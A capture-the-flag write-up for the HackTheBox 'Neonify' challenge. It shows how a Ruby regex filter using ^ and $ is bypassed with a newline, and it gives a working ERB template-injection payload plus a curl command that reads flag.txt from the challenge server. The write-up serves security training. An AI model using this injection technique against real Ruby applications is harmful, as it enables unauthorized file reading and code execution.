#  Neonify HTB Challenge 

__________________________________________
# Neonify

Inside the source code we can see that the input is Vulnerable and it can be easily bypassed:
https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/
```ruby
if params[:neon] =~ /^[0-9a-z ]+$/i
```

The ^ and $ in the regex expression does not stop to enter malicious code if it is inject after a new line character `\n`.

We will inject into the html the ERB tag `<%= %>` with the File.open method `File.open(FILE_TO_OPEN.txt').read ` so when it render after the request it will show the flag.

```ruby
<%= File.open('flag.txt').read %>
```
 
### Exploit

```sh
# Url encode <%= File.open('flag.txt').read %> in order to read the flag and make a request with curl
curl -d 'neon=a
%3C%25%3D%20File.open%28%27flag.txt%27%29.read%20%25%3E' CHALLENGE_IP:PORT | grep -i htb
```
